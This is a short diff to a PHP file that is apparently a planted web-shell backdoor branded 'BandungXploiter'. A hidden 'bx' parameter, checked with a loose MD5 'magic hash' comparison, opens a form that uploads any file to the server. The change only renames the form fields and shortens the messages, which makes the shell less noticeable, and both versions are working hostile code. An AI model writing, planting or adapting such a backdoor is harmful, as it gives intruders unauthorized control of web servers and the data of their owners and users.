@@ -1,9 +1,9 @@
 <?
 if (isset($_GET["bx"])) {
     if (hash("md5", $_GET["bx"]) == $_GET["bx"]) {
-        echo 'BandungXploiter <form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded Successfully :p</b><br><br>'; } else { echo '<b>Upload Failed! >:( </b><br><br>'; } }
+        echo 'BandungXploiter <form action="" method="post" enctype="multipart/form-data" name="u" id="u">'; echo '<input type="file" name="file" size="50"><input name="u_u" type="submit" id="u_u" value="Upload"></form>'; if( $_POST['u_u'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>S!</b><br><br>'; } else { echo '<b>F!</b><br><br>'; } }
     } else {
-        echo "Try harder!";
+        echo "?!";
     }
 }
 ?>
